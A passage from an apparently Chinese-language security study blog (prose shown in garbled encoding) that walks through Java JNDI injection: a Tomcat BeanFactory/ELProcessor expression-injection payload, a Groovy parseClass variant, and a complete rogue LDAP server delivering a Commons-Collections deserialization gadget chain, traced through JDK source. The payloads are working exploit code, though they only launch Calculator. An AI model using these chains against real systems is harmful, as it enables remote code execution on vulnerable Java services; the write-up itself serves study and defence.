ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/usr/bin/open','/System/Applications/Calculator.app']).start()\")"));
initialContext.bind("rmi://localhost:1097/Object",ref);
```

é¦–å…ˆæˆ‘ä»¬æ„é€ äº†ResourceRefå¯¹è±¡ï¼ˆResourceRefæ˜¯Referenceçš„å­ç±»ï¼‰

```java
public ResourceRef(String resourceClass, String description,
                   String scope, String auth, boolean singleton,
                   String factory, String factoryLocation) {
  super(resourceClass, factory, factoryLocation);
  StringRefAddr refAddr = null;
  if (description != null) {
    refAddr = new StringRefAddr(DESCRIPTION, description);
    add(refAddr);
  }
  if (scope != null) {
    refAddr = new StringRefAddr(SCOPE, scope);
    add(refAddr);
  }
  if (auth != null) {
    refAddr = new StringRefAddr(AUTH, auth);
    add(refAddr);
  }
  // singleton is a boolean so slightly different handling
  refAddr = new StringRefAddr(SINGLETON, Boolean.toString(singleton));
  add(refAddr);
}
```

è¿™é‡Œåˆè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼ˆä¹Ÿå³Referenceç±»çš„æ„é€ æ–¹æ³•ï¼‰

```java
public Reference(String className, String factory, String factoryLocation) {
    this(className);
    classFactory = factory;
    classFactoryLocation = factoryLocation;
}

public Reference(String className) {
  this.className  = className;
  addrs = new Vector<>();
}
```

ç»“åˆä¸‹å¯ä»¥å‘ç°ï¼Œå¯¹äºæˆ‘ä»¬ä¼ å…¥çš„ResourceRefå¯¹è±¡ï¼Œæœ€ç»ˆ

```java
ref.className = "javax.el.ELProcessor"
ref.singleton = true
ref.factory = "org.apache.naming.factory.BeanFactory"
```

æˆ‘ä»¬æ¥çœ‹å…¶getObjectInstanceæ–¹æ³•ï¼Œé¦–å…ˆè·Ÿä¸‹å¯ä»¥å‘ç°å…¶ä¼ å…¥çš„objectå‚æ•°å°±æ˜¯æˆ‘ä»¬æ„å»ºçš„refï¼ˆè¿™éƒ¨åˆ†å°±ä¸è·Ÿäº†ï¼‰ï¼Œç„¶åé¦–å…ˆåˆ¤æ–­äº†objæ˜¯å¦ä¸ºResourceRefç±»å‹ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æ„é€ çš„objä¸ºResourceRefçš„åŸå› 

![image-20240328020235288](/blog_img/image-20240328020235288.png)

æ¥ä¸‹æ¥çš„ä»£ç çœ‹å¾—å‡ºæ˜¯è·å–åä¸ºbeanClassNameçš„ç±»çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆé€šè¿‡`.newInstance()`è°ƒç”¨å…¶æ— å‚æ„é€ æ–¹æ³•ï¼‰,getClassNameæ–¹æ³•ä¸ºClassNameçš„getteræ–¹æ³•ï¼Œè‡ªç„¶æ˜¯å¾—åˆ°å…¶ClassNameså±æ€§ä¹Ÿå°±æ˜¯javax.el.ELProcessorï¼Œå› æ­¤è¿™é‡Œçš„beanä¸ºä¸€ä¸ªELProcessorå¯¹è±¡ã€‚

![image-20240328020402124](/blog_img/image-20240328020402124.png)

æ¥ä¸‹æ¥è°ƒç”¨äº†refçš„getæ–¹æ³•

![image-20240328021227781](/blog_img/image-20240328021227781.png)

```java
public RefAddr get(String addrType) {
  int len = addrs.size();
  RefAddr addr;
  for (int i = 0; i < len; i++) {
    addr = addrs.elementAt(i);
    if (addr.getType().compareTo(addrType) == 0)
      return addr;
  }
  return null;
}
```

å¯ä»¥çœ‹åˆ°æœ¬è´¨ä¸Šæ˜¯éå†addrså±æ€§ä¸­çš„æ¯ä¸ªå…ƒç´ çœ‹å…¶getType()çš„è¿”å›å€¼æ˜¯å¦ç­‰äº"forceString"ï¼Œé‚£ä¹ˆaddrså±æ€§åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ

```java
protected Vector<RefAddr> addrs = null;
```

å¯ä»¥çœ‹åˆ°æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªRefAddrç±»å‹çš„Vectorï¼Œæ¥çœ‹ä¸‹RefAddråˆæ˜¯ä»€ä¹ˆï¼š

```java
protected RefAddr(String addrType) {
  this.addrType = addrType;
}
```

è€ŒPOCä¸­çš„`ref.add(new StringRefAddr("forceString", "x=eval"));`

StringRefAddræ˜¯RefAddrçš„å­ç±»ï¼š

```java
public StringRefAddr(String addrType, String addr) {
  super(addrType);
  contents = addr;
}
```

æ‰€ä»¥æœ¬è´¨ä¸Šæ¥è¯´`ref.add(new StringRefAddr("forceString", "x=eval"));`æ˜¯ä¸ºrefçš„addrså±æ€§ï¼ˆä¸€ä¸ªVectorï¼‰ä¸­æ·»åŠ äº†ä¸€ä¸ªaddrTypeå±æ€§ä¸º"forceString"ï¼Œcontentså±æ€§ä¸º"x=eval"çš„StringRefAddr.

æ˜¾ç„¶ï¼Œæ­¤æ—¶raä¸ºæˆ‘ä»¬æ„å»ºçš„StringRefAddrï¼Œvalueä¸º"x=eval"

![image-20240328021227781](/blog_img/image-20240328021227781.png)

æ¥ä¸‹æ¥ä»¥=åˆ†å‰²paramï¼Œè¿™é‡Œä¸éš¾çœ‹å‡ºåœ¨tryè¯­å¥ä¸­paramä¸ºx,`beanClass.getMethod(setterName, paramTypes)`å¾—åˆ°äº†ELProcessorçš„evalæ–¹æ³•ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œçš„paramTypesæ˜¯å‰é¢ç¡®å®šçš„ï¼Œè¦æ±‚åªèƒ½ä¸ºString.Classï¼Œä¹Ÿå°±æ˜¯è¯´åˆ°è¿™é‡Œæˆ‘ä»¬äº‹åè¯¸è‘›äº®åæ¨ä¸€ä¸‹ï¼Œè¿™é‡Œè¦æ±‚å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼Œè¦æ±‚ä¼ å‚åªèƒ½æ˜¯ä¸€ä¸ªStringï¼Œå†ç»“åˆå‰é¢å®ä¾‹åŒ–ç±»æ—¶å¼ºåˆ¶è°ƒç”¨çš„æ˜¯æ— å‚æ„é€ æ–¹æ³•ï¼Œè¦æ»¡è¶³è¿™ä¸¤ä¸ªè¦æ±‚çš„å‘½ä»¤æ‰§è¡Œæ‰‹æ®µå…¶å®å¾ˆå°‘ã€‚

![image-20240328022639380](/blog_img/image-20240328022639380.png)

åœ¨è¿™é‡Œçš„æœ€å,forcedå“ˆå¸Œè¡¨æ¨å…¥äº†ä¸€ä¸ªé”®ä¸ºxï¼Œå€¼ä¸ºevilæ–¹æ³•çš„é”®å€¼å¯¹ã€‚

ä»¥ä¸‹çš„ä»£ç å…¶å®å°±æ˜¯åœ¨è·å–refçš„addrå¯¹è±¡å¹¶éå†ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“addrå±æ€§ä¸ºç‰¹å®šç±»å‹æ—¶å°±è·³è¿‡ä¸‹é¢çš„å¤„ç†è¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯

è€ŒPOCä¸­`ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/usr/bin/open','/System/Applications/Calculator.app']).start()\")"));`

æ–°å¢äº†ä¸€ä¸ªaddrTypeå±æ€§ä¸º"x"ï¼Œcontentså±æ€§ä¸º`"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/usr/bin/open','/System/Applications/Calculator.app']).start()\"`çš„StringRefAddrï¼Œä¸åœ¨è¿™äº›ä¸­ï¼Œæ‰€ä»¥æ‰§è¡Œå…¶getContent()æ–¹æ³•å¾—åˆ°å‘½ä»¤è¯­å¥ï¼Œå†ä»forcedä¸­å–å‡ºé”®ä¸º"x"çš„å€¼ï¼ˆä¹Ÿå³evalæ–¹æ³•ï¼‰ï¼Œæœ€ç»ˆè°ƒç”¨evalæ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚

![image-20240328023534423](/blog_img/image-20240328023534423.png)

è‡³äºå…¶æ‰§è¡Œå‘½ä»¤çš„è¯­å¥ï¼Œå®é™…ä¸Šæ˜¯ELè¡¨è¾¾å¼ï¼Œè¿™éƒ¨åˆ†æˆ‘è¿˜æ²¡å­¦ä¹ ï¼Œç­‰åˆ°ä»¥åå­¦åˆ°ELè¡¨è¾¾å¼æ—¶å†æ·±å…¥ç ”ç©¶ã€‚ä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œåœ¨åˆ©ç”¨é“¾ä¸­æœ€å…³é”®çš„æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆä»¥ä¸‹è¦æ±‚çš„åˆ©ç”¨ç±»ï¼š

- JDKæˆ–è€…å¸¸ç”¨åº“çš„ç±»
- æœ‰publicä¿®é¥°çš„æ— å‚æ„é€ æ–¹æ³•
- publicä¿®é¥°çš„åªæœ‰ä¸€ä¸ªString.classç±»å‹å‚æ•°çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•å¯ä»¥é€ æˆæ¼æ´

é™¤äº†æˆ‘ä»¬ä¸Šé¢åˆ©ç”¨çš„ELProcessorï¼Œä¸€èˆ¬è¿˜å¯ä»¥å°è¯•åˆ©ç”¨`GroovyClassLoader#parseClass`æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæ ¸å¿ƒPOCå˜åŒ–ä¸ºï¼š

```java
ref.add(new StringRefAddr("forceString", "x=parseClass"));
String script = String.format("@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef faster\n", "open -a Calculator");
ref.add(new StringRefAddr("x",script));
```

æ­¤å¤–ï¼Œ[è¿™ç¯‡æ–‡ç« ](https://tttang.com/archive/1405/)ä¸­è¿˜æ¢ç©¶äº†è®¸å¤šå¯ç”¨çš„åˆ©ç”¨ç±»ã€‚

## ä½¿ç”¨LDAPè§¦å‘æœ¬åœ°Gadget

å½“å—å®³è€…æœ¬åœ°å­˜åœ¨å¯ç”¨çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ—¶ï¼Œå¯ä»¥ç”¨LDAPæœåŠ¡æ¥è§¦å‘ååºåˆ—åŒ–ï¼š

è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯æ ¹æ®POCè¿›è¡Œæ­£å‘è°ƒè¯•ï¼š

```java
//LDAP æœåŠ¡
import com.unboundid.ldap.sdk.LDAPException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import com.unboundid.util.Base64;
import java.text.ParseException;
import java.util.HashMap;
import java.util.Map;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class JNDI_LDAP {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] args ) {
        int port = 1389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = "Exploit";
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, IOException, NoSuchFieldException, IllegalAccessException, ParseException {
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", Base64.decode(ccbase64()));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
    private static String ccbase64() throws IOException, NoSuchFieldException, IllegalAccessException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})});
        Map lazymap = LazyMap.decorate(new HashMap<>(), chainedTransformer);
        HashMap<Object, Object> hashMapnew = new HashMap<>();
        TiedMapEntry mapentry = new TiedMapEntry(new HashMap<>(), 'a');
        hashMapnew.put(mapentry,'b');
        Field mapfield = TiedMapEntry.class.getDeclaredField("map");
        mapfield.setAccessible(true);
        mapfield.set(mapentry,lazymap);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(hashMapnew);
        oos.flush();
        return Base64.encode(bos.toByteArray());
    }
}
```

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDIClient {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        RMIinterface rmIinterface = (RMIinterface)initialContext.lookup("ldap://127.0.0.1:1389/Exploit");
        rmIinterface.test();
    }
}
```

å¯¹lookupæ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œä¸€è·¯è·Ÿä¸‹æ¥ä¼šå‘ç°æ¥åˆ°äº†ï¼š

```java
protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
  var2.setError(this, var1);
  Object var3 = null;

  Object var4;
  try {
    SearchControls var22 = new SearchControls();
    var22.setSearchScope(0);
    var22.setReturningAttributes((String[])null);
    var22.setReturningObjFlag(true);
    LdapResult var23 = this.doSearchOnce(var1, "(objectClass=*)", var22, true);
    this.respCtls = var23.resControls;
    if (var23.status != 0) {
      this.processReturnCode(var23, var1);
    }

    if (var23.entries != null && var23.entries.size() == 1) {
      LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
      var4 = var25.attributes;
      Vector var8 = var25.respCtls;
      if (var8 != null) {
        appendVector(this.respCtls, var8);
      }
    } else {
      var4 = new BasicAttributes(true);
    }

    if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
      var3 = Obj.decodeObject((Attributes)var4);
    }

    if (var3 == null) {
      var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
    }
  } catch (LdapReferralException var20) {
    LdapReferralException var5 = var20;
    if (this.handleReferrals == 2) {
      throw var2.fillInException(var20);
    }

    while(true) {
      LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);

      try {
        Object var7 = var6.lookup(var1);
        return var7;
      } catch (LdapReferralException var18) {
        var5 = var18;
      } finally {
        var6.close();
      }
    }
  } catch (NamingException var21) {
    throw var2.fillInException(var21);
  }

  try {
    return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
  } catch (NamingException var16) {
    throw var2.fillInException(var16);
  } catch (Exception var17) {
    NamingException var24 = new NamingException("problem generating object using object factory");
    var24.setRootCause(var17);
    throw var2.fillInException(var24);
  }
}
```

æˆ‘ä»¬å…³æ³¨ä¸‹ï¼š

![image-20240328142550848](/blog_img/image-20240328142550848.png)

è¿™é‡Œè¯´å‡å¦‚var4çš„`Obj.JAVA_ATTRIBUTES[2]`ä¸ä¸ºnullåˆ™ä¼šè°ƒç”¨decodeObjectå¤„ç†var4ï¼Œè€ŒJAVA_ATTRIBUTES[2]ä¸ºjavaClassName

è¿™æ­£æ˜¯POCä¸­è¦è®¾ç½®ä¸€ä¸ªjavaClassNameå±æ€§çš„åŸå› 

```java
protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, IOException, NoSuchFieldException, IllegalAccessException, ParseException {
  e.addAttribute("javaClassName", "foo");
  e.addAttribute("javaSerializedData", Base64.decode(ccbase64()));
  result.sendSearchEntry(e);
  result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
}
```

æ¥çœ‹ä¸‹decodeObjectæ–¹æ³•ï¼š

```java
static Object decodeObject(Attributes var0) throws NamingException {
  String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

  try {
    Attribute var1;
    if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
      ClassLoader var3 = helper.getURLClassLoader(var2);
      return deserializeObject((byte[])((byte[])var1.get()), var3);
    } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
      return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
    } else {
      var1 = var0.get(JAVA_ATTRIBUTES[0]);
      return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
    }
  } catch (IOException var5) {
    NamingException var4 = new NamingException();
    var4.setRootCause(var5);
    throw var4;
  }
}
```

è¿™é‡Œåˆ¤æ–­äº†æˆ‘ä»¬ä¼ å…¥çš„objæ˜¯å¦æœ‰JAVA_ATTRIBUTES[1]çš„é”®ï¼Œå‡å¦‚æœ‰çš„è¯å°±å¯¹å…¶å€¼è°ƒç”¨`deserializeObject`æ–¹æ³•ï¼Œè€Œ

JAVA_ATTRIBUTES[1]æ­£å¯¹åº”äº†POCä¸­çš„javaSerializedDataï¼Œæ¥ä¸‹æ¥æ¥çœ‹ä¸‹deserializeObjectæ–¹æ³•ï¼š

```java
private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
  try {
    ByteArrayInputStream var2 = new ByteArrayInputStream(var0);

    try {
      Object var20 = var1 == null ? new ObjectInputStream(var2) : new LoaderInputStream(var2, var1);
      Throwable var21 = null;

      Object var5;
      try {
        var5 = ((ObjectInputStream)var20).readObject();
      } catch (Throwable var16) {
        var21 = var16;
        throw var16;
      } finally {
        if (var20 != null) {
          if (var21 != null) {
            try {
              ((ObjectInputStream)var20).close();
            } catch (Throwable var15) {
              var21.addSuppressed(var15);
            }
          } else {
            ((ObjectInputStream)var20).close();
          }
        }

      }

      return var5;
    } catch (ClassNotFoundException var18) {
      NamingException var4 = new NamingException();
      var4.setRootCause(var18);
      throw var4;
    }
  } catch (IOException var19) {
    NamingException var3 = new NamingException();
    var3.setRootCause(var19);
    throw var3;
  }
}
```

å½“ä¸­è°ƒç”¨äº†readObjectæ–¹æ³•ï¼Œä¼šè§¦å‘æ¼æ´

# å‚è€ƒæ–‡ç« 

[Javaååºåˆ—åŒ–ä¹‹JNDIå­¦ä¹ ](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/)

[Javaå®‰å…¨å­¦ä¹ â€”â€”JNDIæ³¨å…¥](https://goodapple.top/archives/696)

[JNDI æ³¨å…¥åˆ©ç”¨ Bypass é«˜ç‰ˆæœ¬ JDK é™åˆ¶](http://wjlshare.com/archives/1661)

